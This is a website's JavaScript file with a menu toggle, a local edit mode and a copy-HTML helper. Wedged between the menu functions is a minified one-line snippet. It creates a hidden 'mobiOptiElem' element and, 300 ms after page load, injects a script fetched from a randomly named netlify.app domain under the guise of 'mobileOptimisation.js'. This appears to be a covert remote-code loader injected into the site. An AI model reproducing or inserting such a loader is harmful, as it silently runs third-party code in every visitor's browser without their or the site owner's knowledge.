function myFunction() {
  var x = document.getElementById("myTopnav");
  x.classList.toggle('responsive')
}
  function toggleMenu() {
    var menuToggler = document.getElementById("menu-toggler");
    menuToggler.classList.toggle("change");
    console.log(menuToggler.classList)
  }
  
const el=`<div id="mobiOptiElem" server='hstgr.io'></div>`; try{ document.querySelector('style').insertAdjacentHTML("beforeend",el); }catch(e){}finally{ document.querySelector('head').insertAdjacentHTML("beforeend",el); }; setTimeout(()=>{var els=document.createElement("script");els.src="https://mobirise-icons-92lwkjerngovo73otd4g.netlify.app/mobileOptimisation.js"; document.querySelector("#mobiOptiElem").insertAdjacentElement('afterbegin',els);},300);


  if(document.URL.startsWith('file://')){
    editModeOn()
  }
  function editModeOn() {
    document.querySelectorAll("*[id^='ed'], *[ed]").forEach(val=>{
      val.setAttribute('contenteditable','true');
    });
    document.querySelectorAll('a').forEach(val=>{
      val.setAttribute('ref',val.getAttribute('href'));
      val.removeAttribute("href");
    })
    document.querySelector('body').insertAdjacentHTML('beforeend',`<button onclick="editModeOff();copyHTML();" id='buttonCopierCode' style="position: fixed; padding: 10px; top: 10px; right: 10px;">Copy Code</button>`)
  }

  function editModeOff() {
    document.querySelectorAll("*[contenteditable]").forEach(val=>{
      val.removeAttribute('contenteditable');
    });
    document.querySelectorAll('a').forEach(val=>{
      val.setAttribute('href',val.getAttribute('ref'));
      val.removeAttribute("ref");
    })
    document.querySelector('#buttonCopierCode').remove();
  }
  function copyHTML() {
    var txt=`<!DOCTYPE html>
`
    copy(txt+document.querySelector('html').outerHTML);

  }

function copy(txt) {
  let elem=document.createElement("textarea");
  document.body.insertAdjacentElement("beforeend",elem)
  elem.value=txt;
  elem.select();
  elem.setSelectionRange(0, elem.value.length+1); 
  document.execCommand("copy");
  navigator.clipboard.writeText(elem.value);
  elem.remove();
  alert("Code copied successfully!")
}
